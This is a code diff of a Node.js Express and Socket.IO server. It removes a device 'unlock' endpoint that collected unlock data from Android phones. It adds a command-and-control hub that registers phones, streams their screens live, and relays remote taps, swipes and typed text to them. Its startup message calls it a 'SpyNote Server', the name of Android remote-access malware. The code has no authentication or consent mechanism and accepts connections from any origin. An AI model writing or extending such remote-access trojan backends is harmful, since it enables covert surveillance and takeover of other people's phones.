@@ -1,70 +1,93 @@
 const express = require('express');
 const http = require('http');
-const cors = require('cors');
+const socketIo = require('socket.io');
+const path = require('path');
+const compression = require('compression');
 
 const app = express();
-const port = process.env.PORT || 3000;
-const devices = new Map(); // deviceId -> {unlockToken, used: false}
-
-app.use(cors());
-app.use(express.json());
-
-app.get('/api/device', (req, res) => {
-    const { action, device, data, model, android, unlock } = req.query;
-    
-    if (action === 'register') {
-        devices.set(device, {
-            model: model || 'Unknown',
-            android: android || 'Unknown',
-            unlockToken: Math.random().toString(36).substr(2, 9),
-            used: false
-        });
-        console.log(`Device registered: ${device} (${model}, Android ${android})`);
-        res.json({ status: 'registered', deviceId: device, token: devices.get(device).unlockToken });
-    }
-    
-    else if (action === 'unlock_data') {
-        if (devices.has(device)) {
-            console.log(`Unlock data from ${device}: ${data}`);
-            res.json({ status: 'received', device });
-        } else {
-            res.status(404).json({ error: 'Device not registered' });
-        }
-    }
-    
-    else if (action === 'unlock' || unlock === 'true') {
-        if (devices.has(device)) {
-            const dev = devices.get(device);
-            if (!dev.used) {
-                dev.used = true;
-                console.log(`UNLOCK TRIGGERED for ${device}`);
-                res.json({ status: 'UNLOCK' });
-            } else {
-                console.log(`Unlock already used for ${device}`);
-                res.json({ status: 'ALREADY_USED' });
-            }
-        } else {
-            res.status(404).json({ error: 'Device not registered' });
-        }
-    }
-    
-    else {
-        res.json({
-            devices: Array.from(devices.entries()).map(([id, data]) => ({
-                id,
-                model: data.model,
-                android: data.android,
-                unlockToken: data.unlockToken,
-                used: data.used
-            }))
-        });
-    }
-});
-
 const server = http.createServer(app);
-server.listen(port, () => {
-    console.log(`Server running on port ${port}`);
-    console.log(`Usage: /api/device?$deviceid&unlock=true`);
+const io = socketIo(server, {
+    cors: { origin: "*", methods: ["GET", "POST"] },
+    pingTimeout: 60000,
+    pingInterval: 25000
 });
 
-module.exports = app;
+app.use(compression());
+app.use(express.static('public'));
+app.use(express.json({ limit: '50mb' }));
+
+const devices = new Map();
+
+app.post('/register', (req, res) => {
+    const { deviceId, model, brand, version, status } = req.body;
+    if (deviceId) {
+        devices.set(deviceId, { model, brand, version, status, connected: true });
+        console.log("✅ Device registered:", deviceId);
+        io.emit('devices-update', Array.from(devices.entries()));
+    }
+    res.json({ success: true });
+});
+
+app.get('/devices', (req, res) => {
+    res.json(Array.from(devices.entries()));
+});
+
+io.on('connection', (socket) => {
+    console.log('🔌 New connection:', socket.id);
+
+    socket.on('register-device', (deviceInfo) => {
+        const deviceId = deviceInfo.deviceId;
+        if (deviceId) {
+            devices.set(deviceId, { 
+                ...deviceInfo, 
+                connected: true, 
+                socketId: socket.id 
+            });
+            socket.join(deviceId);
+            console.log("📱 Device joined room:", deviceId);
+            io.emit('devices-update', Array.from(devices.entries()));
+        }
+    });
+
+    // 🔥 ULTRA-SMOOTH SCREEN CASTING
+    socket.on('screen-frame', (data) => {
+        const deviceId = data.deviceId;
+        if (devices.has(deviceId)) {
+            socket.to(deviceId).emit('screen-update', data);
+        }
+    });
+
+    // 🔥 ENHANCED CONTROLS (Tap, Swipe, Scroll, Type)
+    socket.on('control', (data) => {
+        const { deviceId, action, x, y, startX, startY, endX, endY, text, direction } = data;
+        if (devices.has(deviceId)) {
+            socket.to(deviceId).emit('control', {
+                action, 
+                x: parseFloat(x) || 0, 
+                y: parseFloat(y) || 0,
+                startX: parseFloat(startX) || 0, 
+                startY: parseFloat(startY) || 0,
+                endX: parseFloat(endX) || 0, 
+                endY: parseFloat(endY) || 0,
+                text: text || '',
+                direction: direction || ''
+            });
+            console.log('🎮 Control:', action, '→', deviceId);
+        }
+    });
+
+    socket.on('disconnect', () => {
+        for (const [deviceId, info] of devices.entries()) {
+            if (info.socketId === socket.id) {
+                devices.set(deviceId, { ...info, connected: false });
+                io.emit('devices-update', Array.from(devices.entries()));
+                break;
+            }
+        }
+    });
+});
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`🚀 SpyNote Server running on port ${PORT}`);
+});
